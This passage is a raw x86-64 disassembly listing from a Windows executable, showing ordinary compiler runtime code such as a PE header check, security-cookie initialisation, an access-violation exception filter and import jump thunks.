   140008938:	75 20                	jne    0x14000895a
   14000893a:	48 63 41 3c          	movslq 0x3c(%rcx),%rax
   14000893e:	48 03 c1             	add    %rcx,%rax
   140008941:	81 38 50 45 00 00    	cmpl   $0x4550,(%rax)
   140008947:	75 11                	jne    0x14000895a
   140008949:	b9 0b 02 00 00       	mov    $0x20b,%ecx
   14000894e:	66 39 48 18          	cmp    %cx,0x18(%rax)
   140008952:	75 06                	jne    0x14000895a
   140008954:	b8 01 00 00 00       	mov    $0x1,%eax
   140008959:	c3                   	ret
   14000895a:	33 c0                	xor    %eax,%eax
   14000895c:	c3                   	ret
   14000895d:	cc                   	int3
   14000895e:	cc                   	int3
   14000895f:	cc                   	int3
   140008960:	cc                   	int3
   140008961:	cc                   	int3
   140008962:	cc                   	int3
   140008963:	cc                   	int3
   140008964:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140008969:	55                   	push   %rbp
   14000896a:	48 8b ec             	mov    %rsp,%rbp
   14000896d:	48 83 ec 20          	sub    $0x20,%rsp
   140008971:	48 83 65 18 00       	andq   $0x0,0x18(%rbp)
   140008976:	48 bb 32 a2 df 2d 99 	movabs $0x2b992ddfa232,%rbx
   14000897d:	2b 00 00 
   140008980:	48 8b 05 81 36 00 00 	mov    0x3681(%rip),%rax        # 0x14000c008
   140008987:	48 3b c3             	cmp    %rbx,%rax
   14000898a:	0f 85 93 00 00 00    	jne    0x140008a23
   140008990:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   140008994:	ff 15 be 0a 00 00    	call   *0xabe(%rip)        # 0x140009458
   14000899a:	48 8b 45 18          	mov    0x18(%rbp),%rax
   14000899e:	48 89 45 10          	mov    %rax,0x10(%rbp)
   1400089a2:	ff 15 a0 0a 00 00    	call   *0xaa0(%rip)        # 0x140009448
   1400089a8:	8b c0                	mov    %eax,%eax
   1400089aa:	48 31 45 10          	xor    %rax,0x10(%rbp)
   1400089ae:	ff 15 9c 0a 00 00    	call   *0xa9c(%rip)        # 0x140009450
   1400089b4:	8b c0                	mov    %eax,%eax
   1400089b6:	48 31 45 10          	xor    %rax,0x10(%rbp)
   1400089ba:	ff 15 a0 0a 00 00    	call   *0xaa0(%rip)        # 0x140009460
   1400089c0:	8b c0                	mov    %eax,%eax
   1400089c2:	48 c1 e0 18          	shl    $0x18,%rax
   1400089c6:	48 31 45 10          	xor    %rax,0x10(%rbp)
   1400089ca:	ff 15 90 0a 00 00    	call   *0xa90(%rip)        # 0x140009460
   1400089d0:	8b c0                	mov    %eax,%eax
   1400089d2:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   1400089d6:	48 33 45 10          	xor    0x10(%rbp),%rax
   1400089da:	48 33 c1             	xor    %rcx,%rax
   1400089dd:	48 8d 4d 20          	lea    0x20(%rbp),%rcx
   1400089e1:	48 89 45 10          	mov    %rax,0x10(%rbp)
   1400089e5:	ff 15 55 0a 00 00    	call   *0xa55(%rip)        # 0x140009440
   1400089eb:	8b 45 20             	mov    0x20(%rbp),%eax
   1400089ee:	48 b9 ff ff ff ff ff 	movabs $0xffffffffffff,%rcx
   1400089f5:	ff 00 00 
   1400089f8:	48 c1 e0 20          	shl    $0x20,%rax
   1400089fc:	48 33 45 20          	xor    0x20(%rbp),%rax
   140008a00:	48 33 45 10          	xor    0x10(%rbp),%rax
   140008a04:	48 23 c1             	and    %rcx,%rax
   140008a07:	48 8b c8             	mov    %rax,%rcx
   140008a0a:	48 3b c3             	cmp    %rbx,%rax
   140008a0d:	75 0d                	jne    0x140008a1c
   140008a0f:	48 b8 33 a2 df 2d 99 	movabs $0x2b992ddfa233,%rax
   140008a16:	2b 00 00 
   140008a19:	48 8b c8             	mov    %rax,%rcx
   140008a1c:	48 89 0d e5 35 00 00 	mov    %rcx,0x35e5(%rip)        # 0x14000c008
   140008a23:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
   140008a28:	48 f7 d0             	not    %rax
   140008a2b:	48 89 05 de 35 00 00 	mov    %rax,0x35de(%rip)        # 0x14000c010
   140008a32:	48 83 c4 20          	add    $0x20,%rsp
   140008a36:	5d                   	pop    %rbp
   140008a37:	c3                   	ret
   140008a38:	cc                   	int3
   140008a39:	cc                   	int3
   140008a3a:	cc                   	int3
   140008a3b:	cc                   	int3
   140008a3c:	cc                   	int3
   140008a3d:	cc                   	int3
   140008a3e:	ff 25 ec 0b 00 00    	jmp    *0xbec(%rip)        # 0x140009630
   140008a44:	cc                   	int3
   140008a45:	cc                   	int3
   140008a46:	cc                   	int3
   140008a47:	cc                   	int3
   140008a48:	cc                   	int3
   140008a49:	cc                   	int3
   140008a4a:	ff 25 78 0b 00 00    	jmp    *0xb78(%rip)        # 0x1400095c8
   140008a50:	cc                   	int3
   140008a51:	cc                   	int3
   140008a52:	cc                   	int3
   140008a53:	cc                   	int3
   140008a54:	cc                   	int3
   140008a55:	cc                   	int3
   140008a56:	cc                   	int3
   140008a57:	cc                   	int3
   140008a58:	cc                   	int3
   140008a59:	cc                   	int3
   140008a5a:	cc                   	int3
   140008a5b:	cc                   	int3
   140008a5c:	cc                   	int3
   140008a5d:	cc                   	int3
   140008a5e:	cc                   	int3
   140008a5f:	cc                   	int3
   140008a60:	c2 00 00             	ret    $0x0
   140008a63:	cc                   	int3
   140008a64:	cc                   	int3
   140008a65:	cc                   	int3
   140008a66:	cc                   	int3
   140008a67:	cc                   	int3
   140008a68:	cc                   	int3
   140008a69:	cc                   	int3
   140008a6a:	cc                   	int3
   140008a6b:	cc                   	int3
   140008a6c:	cc                   	int3
   140008a6d:	cc                   	int3
   140008a6e:	cc                   	int3
   140008a6f:	cc                   	int3
   140008a70:	cc                   	int3
   140008a71:	cc                   	int3
   140008a72:	cc                   	int3
   140008a73:	cc                   	int3
   140008a74:	cc                   	int3
   140008a75:	cc                   	int3
   140008a76:	cc                   	int3
   140008a77:	cc                   	int3
   140008a78:	48 83 ec 28          	sub    $0x28,%rsp
   140008a7c:	4d 8b 41 38          	mov    0x38(%r9),%r8
   140008a80:	48 8b ca             	mov    %rdx,%rcx
   140008a83:	49 8b d1             	mov    %r9,%rdx
   140008a86:	e8 11 00 00 00       	call   0x140008a9c
   140008a8b:	b8 01 00 00 00       	mov    $0x1,%eax
   140008a90:	48 83 c4 28          	add    $0x28,%rsp
   140008a94:	c3                   	ret
   140008a95:	cc                   	int3
   140008a96:	cc                   	int3
   140008a97:	cc                   	int3
   140008a98:	cc                   	int3
   140008a99:	cc                   	int3
   140008a9a:	cc                   	int3
   140008a9b:	cc                   	int3
   140008a9c:	40 53                	rex push %rbx
   140008a9e:	45 8b 18             	mov    (%r8),%r11d
   140008aa1:	48 8b da             	mov    %rdx,%rbx
   140008aa4:	41 83 e3 f8          	and    $0xfffffff8,%r11d
   140008aa8:	4c 8b c9             	mov    %rcx,%r9
   140008aab:	41 f6 00 04          	testb  $0x4,(%r8)
   140008aaf:	4c 8b d1             	mov    %rcx,%r10
   140008ab2:	74 13                	je     0x140008ac7
   140008ab4:	41 8b 40 08          	mov    0x8(%r8),%eax
   140008ab8:	4d 63 50 04          	movslq 0x4(%r8),%r10
   140008abc:	f7 d8                	neg    %eax
   140008abe:	4c 03 d1             	add    %rcx,%r10
   140008ac1:	48 63 c8             	movslq %eax,%rcx
   140008ac4:	4c 23 d1             	and    %rcx,%r10
   140008ac7:	49 63 c3             	movslq %r11d,%rax
   140008aca:	4a 8b 14 10          	mov    (%rax,%r10,1),%rdx
   140008ace:	48 8b 43 10          	mov    0x10(%rbx),%rax
   140008ad2:	8b 48 08             	mov    0x8(%rax),%ecx
   140008ad5:	48 8b 43 08          	mov    0x8(%rbx),%rax
   140008ad9:	f6 44 01 03 0f       	testb  $0xf,0x3(%rcx,%rax,1)
   140008ade:	74 0b                	je     0x140008aeb
   140008ae0:	0f b6 44 01 03       	movzbl 0x3(%rcx,%rax,1),%eax
   140008ae5:	83 e0 f0             	and    $0xfffffff0,%eax
   140008ae8:	4c 03 c8             	add    %rax,%r9
   140008aeb:	4c 33 ca             	xor    %rdx,%r9
   140008aee:	49 8b c9             	mov    %r9,%rcx
   140008af1:	5b                   	pop    %rbx
   140008af2:	e9 79 f9 ff ff       	jmp    0x140008470
   140008af7:	cc                   	int3
   140008af8:	cc                   	int3
   140008af9:	cc                   	int3
   140008afa:	cc                   	int3
   140008afb:	cc                   	int3
   140008afc:	cc                   	int3
   140008afd:	ff 25 35 0b 00 00    	jmp    *0xb35(%rip)        # 0x140009638
   140008b03:	cc                   	int3
   140008b04:	cc                   	int3
   140008b05:	cc                   	int3
   140008b06:	cc                   	int3
   140008b07:	cc                   	int3
   140008b08:	cc                   	int3
   140008b09:	ff 25 c1 0a 00 00    	jmp    *0xac1(%rip)        # 0x1400095d0
   140008b0f:	cc                   	int3
   140008b10:	cc                   	int3
   140008b11:	cc                   	int3
   140008b12:	cc                   	int3
   140008b13:	cc                   	int3
   140008b14:	cc                   	int3
   140008b15:	cc                   	int3
   140008b16:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140008b1d:	00 00 00 
   140008b20:	ff e0                	jmp    *%rax
   140008b22:	cc                   	int3
   140008b23:	cc                   	int3
   140008b24:	cc                   	int3
   140008b25:	cc                   	int3
   140008b26:	cc                   	int3
   140008b27:	cc                   	int3
   140008b28:	cc                   	int3
   140008b29:	cc                   	int3
   140008b2a:	cc                   	int3
   140008b2b:	cc                   	int3
   140008b2c:	cc                   	int3
   140008b2d:	cc                   	int3
   140008b2e:	cc                   	int3
   140008b2f:	cc                   	int3
   140008b30:	40 55                	rex push %rbp
   140008b32:	48 83 ec 20          	sub    $0x20,%rsp
   140008b36:	48 8b ea             	mov    %rdx,%rbp
   140008b39:	48 8b 01             	mov    (%rcx),%rax
   140008b3c:	48 8b d1             	mov    %rcx,%rdx
   140008b3f:	8b 08                	mov    (%rax),%ecx
   140008b41:	e8 68 fc ff ff       	call   0x1400087ae
   140008b46:	90                   	nop
   140008b47:	48 83 c4 20          	add    $0x20,%rsp
   140008b4b:	5d                   	pop    %rbp
   140008b4c:	c3                   	ret
   140008b4d:	cc                   	int3
   140008b4e:	cc                   	int3
   140008b4f:	cc                   	int3
   140008b50:	cc                   	int3
   140008b51:	cc                   	int3
   140008b52:	cc                   	int3
   140008b53:	cc                   	int3
   140008b54:	cc                   	int3
   140008b55:	cc                   	int3
   140008b56:	cc                   	int3
   140008b57:	cc                   	int3
   140008b58:	cc                   	int3
   140008b59:	cc                   	int3
   140008b5a:	cc                   	int3
   140008b5b:	cc                   	int3
   140008b5c:	cc                   	int3
   140008b5d:	cc                   	int3
   140008b5e:	cc                   	int3
   140008b5f:	cc                   	int3
   140008b60:	40 55                	rex push %rbp
   140008b62:	48 83 ec 20          	sub    $0x20,%rsp
   140008b66:	48 8b ea             	mov    %rdx,%rbp
   140008b69:	48 8b 01             	mov    (%rcx),%rax
   140008b6c:	33 c9                	xor    %ecx,%ecx
   140008b6e:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%rax)
   140008b74:	0f 94 c1             	sete   %cl
   140008b77:	8b c1                	mov    %ecx,%eax
   140008b79:	48 83 c4 20          	add    $0x20,%rsp
   140008b7d:	5d                   	pop    %rbp
   140008b7e:	c3                   	ret
   140008b7f:	cc                   	int3
